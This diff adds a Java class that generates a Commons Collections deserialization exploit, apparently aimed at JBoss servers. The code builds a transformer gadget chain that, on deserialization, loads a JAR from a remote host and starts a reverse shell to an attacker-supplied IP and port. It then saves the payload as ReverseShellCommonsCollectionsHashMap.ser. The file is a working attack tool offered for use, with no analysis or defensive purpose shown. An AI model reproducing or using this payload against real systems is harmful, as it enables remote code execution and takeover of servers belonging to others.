@@ -1,0 +1,118 @@
+package com.jboss.main;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+public class Payload {
+	@SuppressWarnings ( {"unchecked"} )
+	public String PayloadGeneration(String info) throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
+    IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException, NoSuchFieldException {
+		 String remoteJar = "http://scan.javasec.cn/java/JexRemoteTools.jar";
+	        String host = null;
+	        int port = 1331;
+	        String msg = null;
+
+	        // Verifica se o usuário forneceu o comando a ser executado
+	        if (info.equalsIgnoreCase("") ) {
+	            msg = "Invalid params! \n" +
+	                    "Example usage: java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap \"REMOTE_IP:PORT\"";
+	            FileOutputStream fos = null;
+	            return msg;
+	        }
+	        host = info.split(":")[0];
+	        port = Integer.parseInt(info.split(":")[1]);
+
+	        Transformer[] transformers = new Transformer[] {
+
+	                new ConstantTransformer(URLClassLoader.class),
+	                new InstantiateTransformer(
+	                        new Class[]{
+	                                URL[].class
+	                        },
+	                        new Object[]{
+	                                new URL[]{new URL(remoteJar)}
+	                        }),
+	                new InvokerTransformer("loadClass",
+	                        new Class[]{
+	                                String.class
+	                        },
+	                        new Object[]{
+	                                "JexReverse"
+	                        }),
+	                new InstantiateTransformer(
+	                        new Class[]{  String.class, int.class },
+	                        new Object[]{  host, port  }
+	                )
+	        };
+
+	        // Cria o objeto ChainedTransformer com o array de Transformers:
+	        Transformer transformerChain = new ChainedTransformer(transformers);
+	        // Cria o map
+	        Map map1 = new HashMap();
+	        // Decora o map com o LazyMap e a cadeia de transformações como factory
+	        Map lazyMap = LazyMap.decorate(map1,transformerChain);
+
+	        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+	        HashSet map = new HashSet(1);
+	        map.add("foo");
+	        Field f = null;
+	        try {
+	            f = HashSet.class.getDeclaredField("map");
+	        } catch (NoSuchFieldException e) {
+	            f = HashSet.class.getDeclaredField("backingMap");
+	        }
+
+	        f.setAccessible(true);
+	        HashMap innimpl = (HashMap) f.get(map);
+
+	        Field f2 = null;
+	        try {
+	            f2 = HashMap.class.getDeclaredField("table");
+	        } catch (NoSuchFieldException e) {
+	            f2 = HashMap.class.getDeclaredField("elementData");
+	        }
+
+	        f2.setAccessible(true);
+	        Object[] array = (Object[]) f2.get(innimpl);
+
+	        Object node = array[0];
+	        if(node == null){
+	            node = array[1];
+	        }
+
+	        Field keyField = null;
+	        try{
+	            keyField = node.getClass().getDeclaredField("key");
+	        }catch(Exception e){
+	            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
+	        }
+
+	        keyField.setAccessible(true);
+	        keyField.set(node, entry);
+
+	        // Serializa o objeto
+	        System.out.println("Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser");
+	        FileOutputStream fos = new FileOutputStream("ReverseShellCommonsCollectionsHashMap.ser");
+	        ObjectOutputStream oos = new ObjectOutputStream(fos);
+	        oos.writeObject(map);
+	        oos.flush();
+	        msg = "payload generation success.";
+	        return msg;
+	    }
+	}
